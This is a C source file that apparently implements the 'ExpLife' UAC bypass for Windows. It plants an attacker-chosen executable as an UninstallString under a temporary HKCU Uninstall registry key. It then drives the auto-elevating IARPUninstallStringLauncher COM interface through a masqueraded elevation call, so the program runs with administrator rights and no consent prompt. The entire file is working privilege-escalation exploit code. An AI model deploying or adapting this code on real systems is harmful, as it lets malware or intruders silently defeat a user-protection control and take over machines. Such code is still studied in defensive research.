/*******************************************************************************
*
*  (C) COPYRIGHT AUTHORS, 2016 - 2017
*
*  TITLE:       EXPLIFE.C
*
*  VERSION:     2.70
*
*  DATE:        01 May 2017
*
*  ExpLife UAC bypass using IARPUninstallStringLauncher.
*  For description please visit original URL
*  http://www.freebuf.com/articles/system/116611.html
*
* THIS CODE AND INFORMATION IS PROVIDED "AS IS" WITHOUT WARRANTY OF
* ANY KIND, EITHER EXPRESSED OR IMPLIED, INCLUDING BUT NOT LIMITED
* TO THE IMPLIED WARRANTIES OF MERCHANTABILITY AND/OR FITNESS FOR A
* PARTICULAR PURPOSE.
*
*******************************************************************************/
#include "global.h"

/*
* ucmMasqueradedAPRLaunchFile
*
* Purpose:
*
* Initialize interface and run required method.
*
*/
BOOL ucmMasqueradedAPRLaunchFile(
    _In_ LPWSTR lpszFileGuid
)
{
    BOOL                         bCond = FALSE;
    HRESULT                      r = E_FAIL;
    IID                          xIID_IARPUninstallStringLauncher;
    CLSID                        xCLSID_IARPUninstallStringLauncher;
    IARPUninstallStringLauncher *USLauncher = NULL;

    do {

        if (lpszFileGuid == NULL)
            break;

        if (CLSIDFromString(T_CLSID_UninstallStringLauncher, &xCLSID_IARPUninstallStringLauncher) != NOERROR) {
            break;
        }
        if (IIDFromString(T_IID_IARPUninstallStringLauncher, &xIID_IARPUninstallStringLauncher) != S_OK) {
            break;
        }

        r = CoCreateInstance(&xCLSID_IARPUninstallStringLauncher, NULL,
            CLSCTX_INPROC_SERVER | CLSCTX_LOCAL_SERVER | CLSCTX_INPROC_HANDLER,
            &xIID_IARPUninstallStringLauncher, &USLauncher);

        if (r != S_OK)
            break;

        r = ucmMasqueradedCoGetObjectElevate(T_CLSID_UninstallStringLauncher,
            CLSCTX_LOCAL_SERVER, &xIID_IARPUninstallStringLauncher, &USLauncher);
        if (r != S_OK)
            break;

        r = USLauncher->lpVtbl->LaunchUninstallStringAndWait(USLauncher, 0, lpszFileGuid, FALSE, NULL);

    } while (bCond);

    if (USLauncher != NULL) {
        USLauncher->lpVtbl->Release(USLauncher);
    }

    return SUCCEEDED(r);
}

/*
* ucmUninstallLauncherMethod
*
* Purpose:
*
* Bypass UAC using AutoElevated undocumented IARPUninstallStringLauncher interface.
*
*/
BOOL ucmUninstallLauncherMethod(
    _In_ LPWSTR lpszExecutable
)
{
    BOOL        bResult = FALSE, bCond = FALSE;
    SIZE_T      cbData;
    HKEY        hKey = NULL;
    LRESULT     lResult;
    GUID        guid;
    WCHAR       szKeyName[MAX_PATH], szGuid[64];

    do {

        if (lpszExecutable == NULL)
            break;

        if (CoCreateGuid(&guid) != S_OK)
            break;

        _strcpy(szKeyName, L"Software\\Microsoft\\Windows\\CurrentVersion\\Uninstall\\");
        if (StringFromGUID2(&guid, szGuid, sizeof(szGuid) / sizeof(WCHAR))) {
            _strcat(szKeyName, szGuid);

            lResult = RegCreateKeyEx(HKEY_CURRENT_USER,
                szKeyName, 0, NULL, REG_OPTION_NON_VOLATILE, MAXIMUM_ALLOWED, NULL, &hKey, NULL);

            if (lResult != ERROR_SUCCESS)
                break;

            cbData = (1 + _strlen(lpszExecutable)) * sizeof(WCHAR);
            lResult = RegSetValueEx(hKey, L"UninstallString", 0, REG_SZ, (BYTE*)lpszExecutable,
                (DWORD)cbData);

            if (lResult != ERROR_SUCCESS)
                break;

            bResult = ucmMasqueradedAPRLaunchFile(szGuid);
        }

    } while (bCond);

    if (hKey != NULL) {
        RegCloseKey(hKey);
        RegDeleteKey(HKEY_CURRENT_USER, szKeyName);
    }

    return bResult;

}
